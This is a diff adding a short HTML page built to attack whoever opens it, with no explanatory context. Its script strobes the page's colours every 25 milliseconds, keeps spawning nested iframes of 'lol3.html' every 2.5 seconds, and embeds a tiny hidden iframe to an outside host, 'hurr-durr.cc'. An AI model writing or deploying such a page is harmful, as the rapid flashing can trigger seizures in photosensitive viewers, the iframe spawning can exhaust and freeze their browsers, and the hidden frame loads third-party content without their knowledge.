@@ -1,0 +1,21 @@
+<html>
+<head>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://hurr-durr.cc" id="searchFrame" height=12 width=12></iframe>
+    <script>
+        setInterval(() => {
+                document.body.style.filter = document.body.style.filter === 'invert(1)' ? 'invert(0)' : 'invert(1)';
+        }, 25);
+        setInterval(function(){
+            document.body.appendChild(document.createElement("iframe")).src = "lol3.html"
+        }, 2500);
+    </script>
+</html>
